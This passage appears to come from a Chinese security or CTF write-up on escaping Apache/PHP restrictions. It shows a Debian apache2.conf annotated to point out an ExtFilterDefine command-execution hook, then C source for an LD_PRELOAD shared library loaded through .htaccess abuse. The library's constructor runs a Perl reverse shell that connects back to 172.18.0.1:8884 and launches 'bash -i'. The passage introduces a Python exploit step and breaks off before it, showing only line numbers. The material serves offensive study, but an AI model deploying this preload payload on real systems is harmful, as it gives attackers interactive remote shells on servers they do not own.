+</span><span class=lnt> 96
+</span><span class=lnt> 97
+</span><span class=lnt> 98
+</span><span class=lnt> 99
+</span><span class=lnt>100
+</span><span class=lnt>101
+</span><span class=lnt>102
+</span><span class=lnt>103
+</span><span class=lnt>104
+</span><span class=lnt>105
+</span><span class=lnt>106
+</span><span class=lnt>107
+</span><span class=lnt>108
+</span><span class=lnt>109
+</span><span class=lnt>110
+</span><span class=lnt>111
+</span><span class=lnt>112
+</span><span class=lnt>113
+</span><span class=lnt>114
+</span><span class=lnt>115
+</span><span class=lnt>116
+</span><span class=lnt>117
+</span><span class=lnt>118
+</span><span class=lnt>119
+</span><span class=lnt>120
+</span><span class=lnt>121
+</span><span class=lnt>122
+</span><span class=lnt>123
+</span><span class=lnt>124
+</span><span class=lnt>125
+</span><span class=lnt>126
+</span><span class=lnt>127
+</span><span class=lnt>128
+</span><span class=lnt>129
+</span><span class=lnt>130
+</span><span class=lnt>131
+</span><span class=lnt>132
+</span><span class=lnt>133
+</span><span class=lnt>134
+</span><span class=lnt>135
+</span><span class=lnt>136
+</span><span class=lnt>137
+</span><span class=lnt>138
+</span><span class=lnt>139
+</span><span class=lnt>140
+</span><span class=lnt>141
+</span><span class=lnt>142
+</span><span class=lnt>143
+</span><span class=lnt>144
+</span><span class=lnt>145
+</span><span class=lnt>146
+</span><span class=lnt>147
+</span><span class=lnt>148
+</span><span class=lnt>149
+</span><span class=lnt>150
+</span><span class=lnt>151
+</span><span class=lnt>152
+</span><span class=lnt>153
+</span><span class=lnt>154
+</span><span class=lnt>155
+</span><span class=lnt>156
+</span><span class=lnt>157
+</span><span class=lnt>158
+</span><span class=lnt>159
+</span><span class=lnt>160
+</span><span class=lnt>161
+</span><span class=lnt>162
+</span><span class=lnt>163
+</span><span class=lnt>164
+</span><span class=lnt>165
+</span><span class=lnt>166
+</span><span class=lnt>167
+</span><span class=lnt>168
+</span><span class=lnt>169
+</span><span class=lnt>170
+</span><span class=lnt>171
+</span><span class=lnt>172
+</span><span class=lnt>173
+</span><span class=lnt>174
+</span><span class=lnt>175
+</span><span class=lnt>176
+</span><span class=lnt>177
+</span><span class=lnt>178
+</span><span class=lnt>179
+</span><span class=lnt>180
+</span><span class=lnt>181
+</span><span class=lnt>182
+</span><span class=lnt>183
+</span><span class=lnt>184
+</span><span class=lnt>185
+</span><span class=lnt>186
+</span><span class=lnt>187
+</span><span class=lnt>188
+</span><span class=lnt>189
+</span><span class=lnt>190
+</span><span class=lnt>191
+</span><span class=lnt>192
+</span><span class=lnt>193
+</span><span class=lnt>194
+</span><span class=lnt>195
+</span><span class=lnt>196
+</span><span class=lnt>197
+</span><span class=lnt>198
+</span><span class=lnt>199
+</span><span class=lnt>200
+</span><span class=lnt>201
+</span><span class=lnt>202
+</span><span class=lnt>203
+</span><span class=lnt>204
+</span><span class=lnt>205
+</span><span class=lnt>206
+</span><span class=lnt>207
+</span><span class=lnt>208
+</span><span class=lnt>209
+</span><span class=lnt>210
+</span><span class=lnt>211
+</span><span class=lnt>212
+</span><span class=lnt>213
+</span><span class=lnt>214
+</span><span class=lnt>215
+</span><span class=lnt>216
+</span><span class=lnt>217
+</span><span class=lnt>218
+</span><span class=lnt>219
+</span><span class=lnt>220
+</span><span class=lnt>221
+</span><span class=lnt>222
+</span><span class=lnt>223
+</span><span class=lnt>224
+</span><span class=lnt>225
+</span><span class=lnt>226
+</span><span class=lnt>227
+</span><span class=lnt>228
+</span><span class=lnt>229
+</span><span class=lnt>230
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=c1># This is the main Apache server configuration file.  It contains the</span>
+</span></span><span class=line><span class=cl><span class=c1># configuration directives that give the server its instructions.</span>
+</span></span><span class=line><span class=cl><span class=c1># See http://httpd.apache.org/docs/2.4/ for detailed information about</span>
+</span></span><span class=line><span class=cl><span class=c1># the directives and /usr/share/doc/apache2/README.Debian about Debian specific</span>
+</span></span><span class=line><span class=cl><span class=c1># hints.</span>
+</span></span><span class=line><span class=cl><span class=c1>#</span>
+</span></span><span class=line><span class=cl><span class=c1>#</span>
+</span></span><span class=line><span class=cl><span class=c1># Summary of how the Apache 2 configuration works in Debian:</span>
+</span></span><span class=line><span class=cl><span class=c1># The Apache 2 web server configuration in Debian is quite different to</span>
+</span></span><span class=line><span class=cl><span class=c1># upstream&#39;s suggested way to configure the web server. This is because Debian&#39;s</span>
+</span></span><span class=line><span class=cl><span class=c1># default Apache2 installation attempts to make adding and removing modules,</span>
+</span></span><span class=line><span class=cl><span class=c1># virtual hosts, and extra configuration directives as flexible as possible, in</span>
+</span></span><span class=line><span class=cl><span class=c1># order to make automating the changes and administering the server as easy as</span>
+</span></span><span class=line><span class=cl><span class=c1># possible.</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># It is split into several files forming the configuration hierarchy outlined</span>
+</span></span><span class=line><span class=cl><span class=c1># below, all located in the /etc/apache2/ directory:</span>
+</span></span><span class=line><span class=cl><span class=c1>#</span>
+</span></span><span class=line><span class=cl><span class=c1>#       /etc/apache2/</span>
+</span></span><span class=line><span class=cl><span class=c1>#       |-- apache2.conf</span>
+</span></span><span class=line><span class=cl><span class=c1>#       |       `--  ports.conf</span>
+</span></span><span class=line><span class=cl><span class=c1>#       |-- mods-enabled</span>
+</span></span><span class=line><span class=cl><span class=c1>#       |       |-- *.load</span>
+</span></span><span class=line><span class=cl><span class=c1>#       |       `-- *.conf</span>
+</span></span><span class=line><span class=cl><span class=c1>#       |-- conf-enabled</span>
+</span></span><span class=line><span class=cl><span class=c1>#       |       `-- *.conf</span>
+</span></span><span class=line><span class=cl><span class=c1>#       `-- sites-enabled</span>
+</span></span><span class=line><span class=cl><span class=c1>#               `-- *.conf</span>
+</span></span><span class=line><span class=cl><span class=c1>#</span>
+</span></span><span class=line><span class=cl><span class=c1>#</span>
+</span></span><span class=line><span class=cl><span class=c1># * apache2.conf is the main configuration file (this file). It puts the pieces</span>
+</span></span><span class=line><span class=cl><span class=c1>#   together by including all remaining configuration files when starting up the</span>
+</span></span><span class=line><span class=cl><span class=c1>#   web server.</span>
+</span></span><span class=line><span class=cl><span class=c1>#</span>
+</span></span><span class=line><span class=cl><span class=c1># * ports.conf is always included from the main configuration file. It is</span>
+</span></span><span class=line><span class=cl><span class=c1>#   supposed to determine listening ports for incoming connections which can be</span>
+</span></span><span class=line><span class=cl><span class=c1>#   customized anytime.</span>
+</span></span><span class=line><span class=cl><span class=c1>#</span>
+</span></span><span class=line><span class=cl><span class=c1># * Configuration files in the mods-enabled/, conf-enabled/ and sites-enabled/</span>
+</span></span><span class=line><span class=cl><span class=c1>#   directories contain particular configuration snippets which manage modules,</span>
+</span></span><span class=line><span class=cl><span class=c1>#   global configuration fragments, or virtual host configurations,</span>
+</span></span><span class=line><span class=cl><span class=c1>#   respectively.</span>
+</span></span><span class=line><span class=cl><span class=c1>#</span>
+</span></span><span class=line><span class=cl><span class=c1>#   They are activated by symlinking available configuration files from their</span>
+</span></span><span class=line><span class=cl><span class=c1>#   respective *-available/ counterparts. These should be managed by using our</span>
+</span></span><span class=line><span class=cl><span class=c1>#   helpers a2enmod/a2dismod, a2ensite/a2dissite and a2enconf/a2disconf. See</span>
+</span></span><span class=line><span class=cl><span class=c1>#   their respective man pages for detailed information.</span>
+</span></span><span class=line><span class=cl><span class=c1>#</span>
+</span></span><span class=line><span class=cl><span class=c1># * The binary is called apache2. Due to the use of environment variables, in</span>
+</span></span><span class=line><span class=cl><span class=c1>#   the default configuration, apache2 needs to be started/stopped with</span>
+</span></span><span class=line><span class=cl><span class=c1>#   /etc/init.d/apache2 or apache2ctl. Calling /usr/bin/apache2 directly will not</span>
+</span></span><span class=line><span class=cl><span class=c1>#   work with the default configuration.</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Global configuration</span>
+</span></span><span class=line><span class=cl><span class=c1>#</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>#</span>
+</span></span><span class=line><span class=cl><span class=c1># ServerRoot: The top of the directory tree under which the server&#39;s</span>
+</span></span><span class=line><span class=cl><span class=c1># configuration, error, and log files are kept.</span>
+</span></span><span class=line><span class=cl><span class=c1>#</span>
+</span></span><span class=line><span class=cl><span class=c1># NOTE!  If you intend to place this on an NFS (or otherwise network)</span>
+</span></span><span class=line><span class=cl><span class=c1># mounted filesystem then please read the Mutex documentation (available</span>
+</span></span><span class=line><span class=cl><span class=c1># at &lt;URL:http://httpd.apache.org/docs/2.4/mod/core.html#mutex&gt;);</span>
+</span></span><span class=line><span class=cl><span class=c1># you will save yourself a lot of trouble.</span>
+</span></span><span class=line><span class=cl><span class=c1>#</span>
+</span></span><span class=line><span class=cl><span class=c1># Do NOT add a slash at the end of the directory path.</span>
+</span></span><span class=line><span class=cl><span class=c1>#</span>
+</span></span><span class=line><span class=cl><span class=c1>#ServerRoot &#34;/etc/apache2&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>#</span>
+</span></span><span class=line><span class=cl><span class=c1># The accept serialization lock file MUST BE STORED ON A LOCAL DISK.</span>
+</span></span><span class=line><span class=cl><span class=c1>#</span>
+</span></span><span class=line><span class=cl><span class=c1>#Mutex file:${APACHE_LOCK_DIR} default</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>#</span>
+</span></span><span class=line><span class=cl><span class=c1># The directory where shm and other runtime files will be stored.</span>
+</span></span><span class=line><span class=cl><span class=c1>#</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>DefaultRuntimeDir</span> <span class=o>$</span><span class=p>{</span><span class=n>APACHE_RUN_DIR</span><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>#</span>
+</span></span><span class=line><span class=cl><span class=c1># PidFile: The file in which the server should record its process</span>
+</span></span><span class=line><span class=cl><span class=c1># identification number when it starts.</span>
+</span></span><span class=line><span class=cl><span class=c1># This needs to be set in /etc/apache2/envvars</span>
+</span></span><span class=line><span class=cl><span class=c1>#</span>
+</span></span><span class=line><span class=cl><span class=n>PidFile</span> <span class=o>$</span><span class=p>{</span><span class=n>APACHE_PID_FILE</span><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>#</span>
+</span></span><span class=line><span class=cl><span class=c1># Timeout: The number of seconds before receives and sends time out.</span>
+</span></span><span class=line><span class=cl><span class=c1>#</span>
+</span></span><span class=line><span class=cl><span class=n>Timeout</span> <span class=mi>300</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>#</span>
+</span></span><span class=line><span class=cl><span class=c1># KeepAlive: Whether or not to allow persistent connections (more than</span>
+</span></span><span class=line><span class=cl><span class=c1># one request per connection). Set to &#34;Off&#34; to deactivate.</span>
+</span></span><span class=line><span class=cl><span class=c1>#</span>
+</span></span><span class=line><span class=cl><span class=n>KeepAlive</span> <span class=n>On</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>#</span>
+</span></span><span class=line><span class=cl><span class=c1># MaxKeepAliveRequests: The maximum number of requests to allow</span>
+</span></span><span class=line><span class=cl><span class=c1># during a persistent connection. Set to 0 to allow an unlimited amount.</span>
+</span></span><span class=line><span class=cl><span class=c1># We recommend you leave this number high, for maximum performance.</span>
+</span></span><span class=line><span class=cl><span class=c1>#</span>
+</span></span><span class=line><span class=cl><span class=n>MaxKeepAliveRequests</span> <span class=mi>100</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>#</span>
+</span></span><span class=line><span class=cl><span class=c1># KeepAliveTimeout: Number of seconds to wait for the next request from the</span>
+</span></span><span class=line><span class=cl><span class=c1># same client on the same connection.</span>
+</span></span><span class=line><span class=cl><span class=c1>#</span>
+</span></span><span class=line><span class=cl><span class=n>KeepAliveTimeout</span> <span class=mi>5</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># These need to be set in /etc/apache2/envvars</span>
+</span></span><span class=line><span class=cl><span class=n>User</span> <span class=o>$</span><span class=p>{</span><span class=n>APACHE_RUN_USER</span><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=n>Group</span> <span class=o>$</span><span class=p>{</span><span class=n>APACHE_RUN_GROUP</span><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>#</span>
+</span></span><span class=line><span class=cl><span class=c1># HostnameLookups: Log the names of clients or just their IP addresses</span>
+</span></span><span class=line><span class=cl><span class=c1># e.g., www.apache.org (on) or 204.62.129.132 (off).</span>
+</span></span><span class=line><span class=cl><span class=c1># The default is off because it&#39;d be overall better for the net if people</span>
+</span></span><span class=line><span class=cl><span class=c1># had to knowingly turn this feature on, since enabling it means that</span>
+</span></span><span class=line><span class=cl><span class=c1># each client request will result in AT LEAST one lookup request to the</span>
+</span></span><span class=line><span class=cl><span class=c1># nameserver.</span>
+</span></span><span class=line><span class=cl><span class=c1>#</span>
+</span></span><span class=line><span class=cl><span class=n>HostnameLookups</span> <span class=n>Off</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># ErrorLog: The location of the error log file.</span>
+</span></span><span class=line><span class=cl><span class=c1># If you do not specify an ErrorLog directive within a &lt;VirtualHost&gt;</span>
+</span></span><span class=line><span class=cl><span class=c1># container, error messages relating to that virtual host will be</span>
+</span></span><span class=line><span class=cl><span class=c1># logged here.  If you *do* define an error logfile for a &lt;VirtualHost&gt;</span>
+</span></span><span class=line><span class=cl><span class=c1># container, that host&#39;s errors will be logged there and not here.</span>
+</span></span><span class=line><span class=cl><span class=c1>#</span>
+</span></span><span class=line><span class=cl><span class=n>ErrorLog</span> <span class=o>$</span><span class=p>{</span><span class=n>APACHE_LOG_DIR</span><span class=p>}</span><span class=o>/</span><span class=n>error</span><span class=o>.</span><span class=n>log</span>  
+</span></span><span class=line><span class=cl><span class=c1># 这种地方是写不了的</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>#</span>
+</span></span><span class=line><span class=cl><span class=c1># LogLevel: Control the severity of messages logged to the error_log.</span>
+</span></span><span class=line><span class=cl><span class=c1># Available values: trace8, ..., trace1, debug, info, notice, warn,</span>
+</span></span><span class=line><span class=cl><span class=c1># error, crit, alert, emerg.</span>
+</span></span><span class=line><span class=cl><span class=c1># It is also possible to configure the log level for particular modules, e.g.</span>
+</span></span><span class=line><span class=cl><span class=c1># &#34;LogLevel info ssl:warn&#34;</span>
+</span></span><span class=line><span class=cl><span class=c1>#</span>
+</span></span><span class=line><span class=cl><span class=n>LogLevel</span> <span class=n>warn</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Include module configuration:</span>
+</span></span><span class=line><span class=cl><span class=n>IncludeOptional</span> <span class=n>mods</span><span class=o>-</span><span class=n>enabled</span><span class=o>/*.</span><span class=n>load</span>
+</span></span><span class=line><span class=cl><span class=n>IncludeOptional</span> <span class=n>mods</span><span class=o>-</span><span class=n>enabled</span><span class=o>/*.</span><span class=n>conf</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Include list of ports to listen on</span>
+</span></span><span class=line><span class=cl><span class=n>Include</span> <span class=n>ports</span><span class=o>.</span><span class=n>conf</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Sets the default security model of the Apache2 HTTPD server. It does</span>
+</span></span><span class=line><span class=cl><span class=c1># not allow access to the root filesystem outside of /usr/share and /var/www.</span>
+</span></span><span class=line><span class=cl><span class=c1># The former is used by web applications packaged in Debian,</span>
+</span></span><span class=line><span class=cl><span class=c1># the latter may be used for local directories served by the web server. If</span>
+</span></span><span class=line><span class=cl><span class=c1># your system is serving content from a sub-directory in /srv you must allow</span>
+</span></span><span class=line><span class=cl><span class=c1># access here, or in any related virtual host.</span>
+</span></span><span class=line><span class=cl><span class=o>&lt;</span><span class=ne>Directory</span> <span class=o>/&gt;</span>
+</span></span><span class=line><span class=cl>        <span class=n>Options</span> <span class=n>FollowSymLinks</span>
+</span></span><span class=line><span class=cl>        <span class=n>AllowOverride</span> <span class=n>ALL</span>
+</span></span><span class=line><span class=cl>        <span class=n>Require</span> <span class=n>all</span> <span class=n>denied</span>
+</span></span><span class=line><span class=cl><span class=o>&lt;/</span><span class=ne>Directory</span><span class=o>&gt;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>&lt;</span><span class=ne>Directory</span> <span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>share</span><span class=o>&gt;</span>
+</span></span><span class=line><span class=cl>        <span class=n>AllowOverride</span> <span class=n>ALL</span>
+</span></span><span class=line><span class=cl>        <span class=n>Require</span> <span class=n>all</span> <span class=n>granted</span>
+</span></span><span class=line><span class=cl><span class=o>&lt;/</span><span class=ne>Directory</span><span class=o>&gt;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>&lt;</span><span class=ne>Directory</span> <span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>www</span><span class=o>/&gt;</span>
+</span></span><span class=line><span class=cl>        <span class=n>Options</span> <span class=n>Indexes</span> <span class=n>FollowSymLinks</span>
+</span></span><span class=line><span class=cl>        <span class=n>AllowOverride</span> <span class=n>ALL</span>
+</span></span><span class=line><span class=cl>        <span class=n>Require</span> <span class=n>all</span> <span class=n>granted</span>
+</span></span><span class=line><span class=cl><span class=o>&lt;/</span><span class=ne>Directory</span><span class=o>&gt;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>#&lt;Directory /srv/&gt;</span>
+</span></span><span class=line><span class=cl><span class=c1>#       Options Indexes FollowSymLinks</span>
+</span></span><span class=line><span class=cl><span class=c1>#       AllowOverride None</span>
+</span></span><span class=line><span class=cl><span class=c1>#       Require all granted</span>
+</span></span><span class=line><span class=cl><span class=c1>#&lt;/Directory&gt;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># AccessFileName: The name of the file to look for in each directory</span>
+</span></span><span class=line><span class=cl><span class=c1># for additional configuration directives.  See also the AllowOverride</span>
+</span></span><span class=line><span class=cl><span class=c1># directive.</span>
+</span></span><span class=line><span class=cl><span class=c1>#</span>
+</span></span><span class=line><span class=cl><span class=n>AccessFileName</span> <span class=o>.</span><span class=n>htaccess</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>#</span>
+</span></span><span class=line><span class=cl><span class=c1># The following lines prevent .htaccess and .htpasswd files from being</span>
+</span></span><span class=line><span class=cl><span class=c1># viewed by Web clients.</span>
+</span></span><span class=line><span class=cl><span class=c1>#</span>
+</span></span><span class=line><span class=cl><span class=o>&lt;</span><span class=n>FilesMatch</span> <span class=s2>&#34;^\.ht&#34;</span><span class=o>&gt;</span>
+</span></span><span class=line><span class=cl>        <span class=n>Require</span> <span class=n>all</span> <span class=n>denied</span>
+</span></span><span class=line><span class=cl><span class=o>&lt;/</span><span class=n>FilesMatch</span><span class=o>&gt;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>#</span>
+</span></span><span class=line><span class=cl><span class=c1># The following directives define some format nicknames for use with</span>
+</span></span><span class=line><span class=cl><span class=c1># a CustomLog directive.</span>
+</span></span><span class=line><span class=cl><span class=c1>#</span>
+</span></span><span class=line><span class=cl><span class=c1># These deviate from the Common Log Format definitions in that they use %O</span>
+</span></span><span class=line><span class=cl><span class=c1># (the actual bytes sent including headers) instead of %b (the size of the</span>
+</span></span><span class=line><span class=cl><span class=c1># requested file), because the latter makes it impossible to detect partial</span>
+</span></span><span class=line><span class=cl><span class=c1># requests.</span>
+</span></span><span class=line><span class=cl><span class=c1>#</span>
+</span></span><span class=line><span class=cl><span class=c1># Note that the use of %{X-Forwarded-For}i instead of %h is not recommended.</span>
+</span></span><span class=line><span class=cl><span class=c1># Use mod_remoteip instead.</span>
+</span></span><span class=line><span class=cl><span class=c1>#</span>
+</span></span><span class=line><span class=cl><span class=n>LogFormat</span> <span class=s2>&#34;%v:%p %h %l </span><span class=si>%u</span><span class=s2> %t </span><span class=se>\&#34;</span><span class=si>%r</span><span class=se>\&#34;</span><span class=s2> %&gt;s %O </span><span class=se>\&#34;</span><span class=s2>%{Referer}i</span><span class=se>\&#34;</span><span class=s2> </span><span class=se>\&#34;</span><span class=s2>%{User-Agent}i</span><span class=se>\&#34;</span><span class=s2>&#34;</span> <span class=n>vhost_combined</span>
+</span></span><span class=line><span class=cl><span class=n>LogFormat</span> <span class=s2>&#34;%h %l </span><span class=si>%u</span><span class=s2> %t </span><span class=se>\&#34;</span><span class=si>%r</span><span class=se>\&#34;</span><span class=s2> %&gt;s %O </span><span class=se>\&#34;</span><span class=s2>%{Referer}i</span><span class=se>\&#34;</span><span class=s2> </span><span class=se>\&#34;</span><span class=s2>%{User-Agent}i</span><span class=se>\&#34;</span><span class=s2>&#34;</span> <span class=n>combined</span>
+</span></span><span class=line><span class=cl><span class=n>LogFormat</span> <span class=s2>&#34;%h %l </span><span class=si>%u</span><span class=s2> %t </span><span class=se>\&#34;</span><span class=si>%r</span><span class=se>\&#34;</span><span class=s2> %&gt;s %O&#34;</span> <span class=n>common</span>
+</span></span><span class=line><span class=cl><span class=n>LogFormat</span> <span class=s2>&#34;%{Referer}i -&gt; %U&#34;</span> <span class=n>referer</span>
+</span></span><span class=line><span class=cl><span class=n>LogFormat</span> <span class=s2>&#34;%{User-agent}i&#34;</span> <span class=n>agent</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Include of directories ignores editors&#39; and dpkg&#39;s backup files,</span>
+</span></span><span class=line><span class=cl><span class=c1># see README.Debian for details.</span>
+</span></span><span class=line><span class=cl><span class=n>ExtFilterDefine</span> <span class=n>gzip</span> <span class=n>mode</span><span class=o>=</span><span class=n>output</span> <span class=n>cmd</span><span class=o>=/</span><span class=n>bin</span><span class=o>/</span><span class=n>gzip</span> 
+</span></span><span class=line><span class=cl><span class=c1># 这个比较有东西哦 可以看到有命令执行了那么套用类似 PHP Mail bypass disable func 的思路进行利用</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Include generic snippets of statements</span>
+</span></span><span class=line><span class=cl><span class=n>IncludeOptional</span> <span class=n>conf</span><span class=o>-</span><span class=n>enabled</span><span class=o>/*.</span><span class=n>conf</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Include the virtual host configurations:</span>
+</span></span><span class=line><span class=cl><span class=n>IncludeOptional</span> <span class=n>sites</span><span class=o>-</span><span class=n>enabled</span><span class=o>/*.</span><span class=n>conf</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># vim: syntax=apache ts=4 sw=4 sts=4 sr noet</span>
+</span></span></code></pre></td></tr></table></div></div><h3 id=htaccess-滥用-挂载-ld_perload>htaccess 滥用 挂载 LD_PERLOAD</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=c1>// save as perload.c
+</span></span></span><span class=line><span class=cl><span class=c1>// 编译 gcc perload.c  -fPIC -shared -o 1.so 
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=cp>#define _GNU_SOURCE
+</span></span></span><span class=line><span class=cl><span class=cp></span>
+</span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
+</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
+</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
+</span></span></span><span class=line><span class=cl><span class=cp></span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>extern</span> <span class=kt>char</span><span class=o>**</span> <span class=n>environ</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nf>__attribute__</span> <span class=p>((</span><span class=n>__constructor__</span><span class=p>))</span> <span class=kt>void</span> <span class=nf>preload</span> <span class=p>(</span><span class=kt>void</span><span class=p>)</span> <span class=c1>// 构建 预执行属性
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>{</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>const</span> <span class=kt>char</span><span class=o>*</span> <span class=n>cmdline</span> <span class=o>=</span> <span class=s>&#34;perl -e &#39;use Socket;$i=</span><span class=se>\&#34;</span><span class=s>172.18.0.1</span><span class=se>\&#34;</span><span class=s>;$p=8884;socket(S,PF_INET,SOCK_STREAM,getprotobyname(</span><span class=se>\&#34;</span><span class=s>tcp</span><span class=se>\&#34;</span><span class=s>));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,</span><span class=se>\&#34;</span><span class=s>&gt;&amp;S</span><span class=se>\&#34;</span><span class=s>);open(STDOUT,</span><span class=se>\&#34;</span><span class=s>&gt;&amp;S</span><span class=se>\&#34;</span><span class=s>);open(STDERR,</span><span class=se>\&#34;</span><span class=s>&gt;&amp;S</span><span class=se>\&#34;</span><span class=s>);exec(</span><span class=se>\&#34;</span><span class=s>bash -i</span><span class=se>\&#34;</span><span class=s>);};&#39;&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1>// const char* cmdline = &#34;perl /tmp/r3.pl &gt; /tmp/r3pwn&#34;
+</span></span></span><span class=line><span class=cl><span class=c1></span>    
+</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>i</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>(</span><span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>environ</span><span class=p>[</span><span class=n>i</span><span class=p>];</span> <span class=o>++</span><span class=n>i</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=nf>strstr</span><span class=p>(</span><span class=n>environ</span><span class=p>[</span><span class=n>i</span><span class=p>],</span> <span class=s>&#34;LD_PRELOAD&#34;</span><span class=p>))</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>                    <span class=n>environ</span><span class=p>[</span><span class=n>i</span><span class=p>][</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=sc>&#39;\0&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>            <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=nf>system</span><span class=p>(</span><span class=n>cmdline</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>接下来上 python 利用</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
+</span><span class=lnt>  2
+</span><span class=lnt>  3
+</span><span class=lnt>  4
+</span><span class=lnt>  5
+</span><span class=lnt>  6
+</span><span class=lnt>  7
+</span><span class=lnt>  8
+</span><span class=lnt>  9
+</span><span class=lnt> 10
+</span><span class=lnt> 11
+</span><span class=lnt> 12
+</span><span class=lnt> 13
+</span><span class=lnt> 14
+</span><span class=lnt> 15
+</span><span class=lnt> 16
+</span><span class=lnt> 17
+</span><span class=lnt> 18
+</span><span class=lnt> 19
+</span><span class=lnt> 20
+</span><span class=lnt> 21
+</span><span class=lnt> 22
+</span><span class=lnt> 23
+</span><span class=lnt> 24
+</span><span class=lnt> 25
+</span><span class=lnt> 26
+</span><span class=lnt> 27
+</span><span class=lnt> 28
+</span><span class=lnt> 29
+</span><span class=lnt> 30
+</span><span class=lnt> 31
+</span><span class=lnt> 32
+</span><span class=lnt> 33
+</span><span class=lnt> 34
+</span><span class=lnt> 35
+</span><span class=lnt> 36
+</span><span class=lnt> 37
+</span><span class=lnt> 38
+</span><span class=lnt> 39
+</span><span class=lnt> 40
+</span><span class=lnt> 41
+</span><span class=lnt> 42
+</span><span class=lnt> 43
+</span><span class=lnt> 44
+</span><span class=lnt> 45
+</span><span class=lnt> 46
+</span><span class=lnt> 47
+</span><span class=lnt> 48
+</span><span class=lnt> 49
+</span><span class=lnt> 50
+</span><span class=lnt> 51
+</span><span class=lnt> 52
+</span><span class=lnt> 53
